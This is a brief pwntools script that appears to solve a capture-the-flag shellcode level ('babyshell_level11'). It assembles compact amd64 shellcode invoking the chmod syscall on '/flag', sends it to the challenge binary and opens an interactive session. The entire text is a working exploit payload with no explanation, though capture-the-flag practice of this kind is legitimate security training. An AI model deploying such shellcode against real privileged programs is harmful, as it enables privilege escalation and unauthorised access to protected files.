from pwn import *
#r = process(['strace','/challenge/babyshell_level8'])
r = process(['/challenge/babyshell_level11'])
context.arch='amd64'
payload = asm(
    '''
    mov al, 90
    add dl, 12
    push rdx
    pop rdi
    push 63
    pop rsi
    syscall
    '''
)+b'\x2f\x66\x6c\x61\x67'


print(payload)
r.send(payload)



r.interactive()